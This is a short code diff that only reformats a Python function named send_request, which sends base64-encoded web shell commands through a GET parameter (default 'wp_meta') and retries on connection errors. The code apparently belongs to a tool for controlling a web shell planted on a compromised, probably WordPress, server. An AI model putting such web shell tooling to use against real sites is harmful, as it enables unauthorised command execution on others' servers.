@@ -674,7 +674,7 @@ def send_request(
     cmd_param: str = "wp_meta",
     verify: bool = False,
     timeout: Optional[float] = None,
-    retry_limit: int = 9
+    retry_limit: int = 9,
 ) -> List[str]:
     """Sends a b64 encoded web shell command via the given GET param.
 
@@ -697,14 +697,16 @@ def send_request(
 
     log.info("Sending web shell command")
     while r is None:
-      try:
-        r = requests.get(url, params=get_params, verify=verify, timeout=timeout)
-      except requests.ConnectionError as e:
-        count += 1
-        if count > retry_limit:
-          raise e
-        log.info("ConnectionError sleeping for {} seconds and retrying...".format(count))
-        sleep(count)
+        try:
+            r = requests.get(url, params=get_params, verify=verify, timeout=timeout)
+        except requests.ConnectionError as e:
+            count += 1
+            if count > retry_limit:
+                raise e
+            log.info(
+                "ConnectionError sleeping for {} seconds and retrying...".format(count)
+            )
+            sleep(count)
     log.info("Sent web shell command")
 
     return decode_response(r.text)
